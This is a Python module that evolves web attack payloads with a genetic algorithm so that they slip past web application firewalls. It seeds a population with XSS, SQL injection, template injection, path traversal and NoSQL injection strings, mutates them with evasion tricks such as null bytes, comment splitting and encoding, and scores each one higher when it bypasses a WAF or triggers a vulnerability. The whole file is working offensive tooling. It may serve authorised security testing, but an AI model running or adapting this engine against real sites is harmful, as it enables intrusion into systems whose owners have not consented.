"""
MSE Genetic Payload Engine
============================
Evolves payloads like living organisms using genetic algorithms.
Survival of the fittest — payloads that bypass WAF reproduce,
those that get blocked die. Mutation introduces variation.
"""

import random
import hashlib
import time
import base64
from typing import List, Dict, Any, Optional
from urllib.parse import quote, quote_plus


ENCODING_GENES = [
    "raw", "url_encode", "double_url", "unicode", "hex",
    "base64", "html_entity", "octal", "utf7", "mixed_case",
]

TECHNIQUE_GENES = [
    "inline", "comment_injection", "null_byte", "newline_injection",
    "tab_injection", "chunked", "case_swap", "concat_split",
    "whitespace_variation", "encoding_chain",
]

WAF_BYPASS_GENES = [
    "content_type_swap", "method_override", "header_pollution",
    "parameter_pollution", "json_to_xml", "multipart_boundary",
    "chunked_transfer", "pipeline_injection", "unicode_normalization",
    "overlong_utf8",
]

INJECTION_POINT_GENES = [
    "query_param", "path_segment", "header_value", "cookie_value",
    "body_json", "body_form", "body_xml", "fragment",
]


class PayloadOrganism:

    def __init__(self, payload_id: str = None):
        self.id = payload_id or hashlib.md5(str(time.time()).encode() + str(random.random()).encode()).hexdigest()[:12]
        self.technique = random.choice(TECHNIQUE_GENES)
        self.encoding = random.choice(ENCODING_GENES)
        self.injection_point = random.choice(INJECTION_POINT_GENES)
        self.waf_bypass: List[str] = random.sample(WAF_BYPASS_GENES, k=random.randint(1, 3))
        self.generation = 0
        self.fitness = 0.0
        self.raw = ""
        self.lineage: List[str] = []

    def to_dict(self) -> Dict:
        return {
            "id": self.id,
            "technique": self.technique,
            "encoding": self.encoding,
            "injection_point": self.injection_point,
            "waf_bypass": self.waf_bypass,
            "generation": self.generation,
            "fitness": self.fitness,
            "raw": self.raw,
            "lineage_depth": len(self.lineage),
        }


class GeneticPayloadEngine:

    def __init__(self, base_payloads: Optional[List[str]] = None):
        self.base_payloads = base_payloads or [
            "<script>alert(1)</script>",
            "' OR 1=1 --",
            "{{7*7}}",
            "${7*7}",
            "../../../etc/passwd",
            "{{constructor.constructor('return this')()}}",
            '{"$gt":""}',
            "admin' --",
        ]
        self.population: List[PayloadOrganism] = []
        self.generation = 0
        self.fitness_history: List[Dict] = []
        self.best_ever: Optional[PayloadOrganism] = None

        self._initialize_population()

    def _initialize_population(self, size: int = 20):
        for base in self.base_payloads:
            org = PayloadOrganism()
            org.raw = base
            org.generation = 0
            self.population.append(org)

        while len(self.population) < size:
            org = PayloadOrganism()
            org.raw = self._mutate_raw(random.choice(self.base_payloads))
            self.population.append(org)

    def evaluate_fitness(self, organism: PayloadOrganism, response: Dict) -> float:
        fitness = 0.0

        status = response.get("status_code", 0)
        if status in (200, 201, 202):
            fitness += 100
        elif status == 403:
            fitness -= 50
        elif status == 400:
            fitness -= 20
        elif status == 500:
            fitness += 30

        if response.get("detected_vuln"):
            fitness += 200

        if response.get("waf_bypassed"):
            fitness += 150

        if response.get("error_leaked"):
            fitness += 50

        raw_len = len(organism.raw)
        if raw_len > 500:
            fitness -= raw_len * 0.05
        elif raw_len < 50:
            fitness += 20

        resp_time = response.get("response_time_ms", 1000)
        if resp_time > 0:
            fitness += min(50, 1000 / resp_time)

        fitness = max(fitness, 0)
        organism.fitness = fitness
        return fitness

    def evolve(self, responses: Optional[List[Dict]] = None) -> List[PayloadOrganism]:
        if responses:
            for i, org in enumerate(self.population):
                if i < len(responses):
                    self.evaluate_fitness(org, responses[i])

        sorted_pop = sorted(self.population, key=lambda o: o.fitness, reverse=True)

        if sorted_pop and (not self.best_ever or sorted_pop[0].fitness > self.best_ever.fitness):
            self.best_ever = sorted_pop[0]

        elite_count = max(2, len(sorted_pop) // 5)
        parents = sorted_pop[:elite_count]

        children: List[PayloadOrganism] = []

        for i in range(0, len(parents) - 1, 2):
            child = self._crossover(parents[i], parents[i + 1])
            children.append(child)

        for parent in parents[:3]:
            mutant = self._deep_mutate(parent)
            children.append(mutant)

        self.population = list(parents) + children

        target_size = max(20, len(self.base_payloads) * 3)
        while len(self.population) < target_size:
            org = PayloadOrganism()
            org.raw = self._mutate_raw(random.choice(self.base_payloads))
            org.generation = self.generation + 1
            self.population.append(org)

        self.generation += 1
        for org in self.population:
            org.generation = self.generation

        self.fitness_history.append({
            "generation": self.generation,
            "best_fitness": sorted_pop[0].fitness if sorted_pop else 0,
            "avg_fitness": sum(o.fitness for o in sorted_pop) / max(1, len(sorted_pop)),
            "population_size": len(self.population),
        })

        return self.population

    def _crossover(self, parent1: PayloadOrganism, parent2: PayloadOrganism) -> PayloadOrganism:
        child = PayloadOrganism()
        child.technique = random.choice([parent1.technique, parent2.technique])
        child.encoding = random.choice([parent1.encoding, parent2.encoding])
        child.injection_point = random.choice([parent1.injection_point, parent2.injection_point])
        child.waf_bypass = list(set(parent1.waf_bypass + parent2.waf_bypass))[:4]
        child.lineage = [parent1.id, parent2.id]
        child.generation = self.generation + 1

        mid = len(parent1.raw) // 2
        child.raw = parent1.raw[:mid] + parent2.raw[mid:]

        if random.random() < 0.3:
            child.raw = self._mutate_raw(child.raw)

        return child

    def _deep_mutate(self, parent: PayloadOrganism) -> PayloadOrganism:
        mutant = PayloadOrganism()
        mutant.technique = parent.technique
        mutant.encoding = parent.encoding
        mutant.injection_point = parent.injection_point
        mutant.waf_bypass = list(parent.waf_bypass)
        mutant.lineage = [parent.id]
        mutant.generation = self.generation + 1

        mutant.raw = self._mutate_raw(parent.raw)

        r = random.random()
        if r < 0.25:
            mutant.technique = random.choice(TECHNIQUE_GENES)
        elif r < 0.50:
            mutant.encoding = random.choice(ENCODING_GENES)
        elif r < 0.75:
            mutant.waf_bypass = random.sample(WAF_BYPASS_GENES, k=random.randint(1, 3))
        else:
            mutant.injection_point = random.choice(INJECTION_POINT_GENES)

        return mutant

    def _mutate_raw(self, raw: str) -> str:
        mutations = [
            lambda s: s.replace(" ", "/**/"),
            lambda s: s.replace("'", "\\'"),
            lambda s: s.upper() if random.random() > 0.5 else s.lower(),
            lambda s: quote(s),
            lambda s: s.replace("<", "%3C").replace(">", "%3E"),
            lambda s: s + "\x00",
            lambda s: s.replace("=", "%3D"),
            lambda s: "\t".join(s.split(" ")),
            lambda s: s.replace("OR", "O\x00R"),
            lambda s: s[:len(s) // 2] + "/**/" + s[len(s) // 2:],
        ]

        mutation = random.choice(mutations)
        try:
            return mutation(raw)
        except Exception:
            return raw

    def get_best_payloads(self, n: int = 5) -> List[Dict]:
        sorted_pop = sorted(self.population, key=lambda o: o.fitness, reverse=True)
        return [o.to_dict() for o in sorted_pop[:n]]

    def generate_report(self) -> Dict:
        return {
            "current_generation": self.generation,
            "population_size": len(self.population),
            "best_fitness": self.best_ever.fitness if self.best_ever else 0,
            "best_payload": self.best_ever.to_dict() if self.best_ever else None,
            "fitness_trend": self.fitness_history[-5:] if self.fitness_history else [],
            "technique_distribution": self._gene_distribution("technique"),
            "encoding_distribution": self._gene_distribution("encoding"),
            "top_5": self.get_best_payloads(5),
        }

    def _gene_distribution(self, attribute: str) -> Dict[str, int]:
        dist: Dict[str, int] = {}
        for org in self.population:
            val = getattr(org, attribute, "unknown")
            dist[val] = dist.get(val, 0) + 1
        return dist
